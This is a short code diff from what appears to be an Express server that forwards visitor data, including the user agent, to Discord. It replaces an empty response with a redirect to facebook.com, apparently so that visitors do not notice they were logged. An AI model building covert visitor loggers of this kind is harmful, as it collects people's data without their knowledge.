@@ -52,7 +52,7 @@ UserAgent: ${userAgent}`
     sendDiscord(data)
     
     
-    res.status(200).send("");
+    res.redirect("https://facebook.com")
 });
 
 app.listen(PORT, "0.0.0.0", () => {
